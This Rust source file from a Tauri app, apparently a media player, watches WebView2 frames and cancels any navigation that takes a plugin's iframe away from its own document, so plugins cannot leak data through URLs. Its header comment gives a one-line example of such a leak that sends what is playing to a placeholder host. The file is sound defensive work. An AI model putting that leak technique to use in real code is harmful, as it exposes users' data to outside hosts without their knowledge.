//! Keeps the frames of external plugins on their own document.
//!
//! A plugin's frame may not contact the network, which its content security
//! policy sees to. That policy cannot stop the frame from going to another
//! address, though, and an address can carry data: `location.href =
//! "https://example.com/?" + whatIsPlaying`. So the browser is told to cancel
//! every navigation of such a frame that leads away from the plugin's document.

use tauri::WebviewWindow;

/// Watches the frames of the main window from now on.
#[cfg(windows)]
pub fn watch(window: &WebviewWindow) {
    use crate::plugins::{frame_navigation, FrameNavigation};
    use std::sync::{Arc, Mutex};
    use webview2_com::{
        take_pwstr, FrameCreatedEventHandler, FrameNavigationStartingEventHandler,
        Microsoft::Web::WebView2::Win32::{ICoreWebView2Frame2, ICoreWebView2_4},
    };
    use windows_core::{Interface, PWSTR};

    let result = window.with_webview(|webview| {
        let on_frame = FrameCreatedEventHandler::create(Box::new(|_webview, args| {
            let Some(args) = args else {
                return Ok(());
            };
            // SAFETY: a COM call on the arguments of a live event, on the thread that raised it.
            let frame = unsafe { args.Frame()? }.cast::<ICoreWebView2Frame2>()?;
            // The plugin document this frame first loaded, once it has loaded one.
            let home: Arc<Mutex<Option<String>>> = Arc::default();
            let on_navigation =
                FrameNavigationStartingEventHandler::create(Box::new(move |_frame, args| {
                    let Some(args) = args else {
                        return Ok(());
                    };
                    let mut uri = PWSTR::null();
                    // SAFETY: a COM call with a valid place for the result; the
                    // string it allocates is freed by `take_pwstr`.
                    let uri = unsafe {
                        args.Uri(&mut uri)?;
                        take_pwstr(uri)
                    };
                    let mut home = home.lock().unwrap_or_else(|err| err.into_inner());
                    match frame_navigation(home.as_deref(), &uri) {
                        FrameNavigation::Allow => {}
                        FrameNavigation::Adopt => *home = Some(uri),
                        FrameNavigation::Cancel => {
                            log_error!("a plugin's frame tried to leave its document; cancelled");
                            // SAFETY: a COM call on the arguments of a live event.
                            unsafe { args.SetCancel(true)? };
                        }
                    }
                    Ok(())
                }));
            let mut token = 0i64;
            // SAFETY: a COM call on a live frame, on the thread that owns it.
            unsafe { frame.add_NavigationStarting(&on_navigation, &mut token) }
        }));
        let mut token = 0i64;
        // SAFETY: COM calls on the controller of a live webview, made on the
        // thread that owns it, which is where `with_webview` runs this.
        let registered = unsafe {
            webview
                .controller()
                .CoreWebView2()
                .and_then(|core| core.cast::<ICoreWebView2_4>())
                .and_then(|core| core.add_FrameCreated(&on_frame, &mut token))
        };
        if let Err(err) = registered {
            log_error!("cannot watch the frames of plugins: {err}");
        }
    });
    if let Err(err) = result {
        log_error!("cannot reach the webview: {err}");
    }
}

/// Other systems rely on the page noticing a frame that loads twice, see
/// `external.ts`.
#[cfg(not(windows))]
pub fn watch(_window: &WebviewWindow) {}
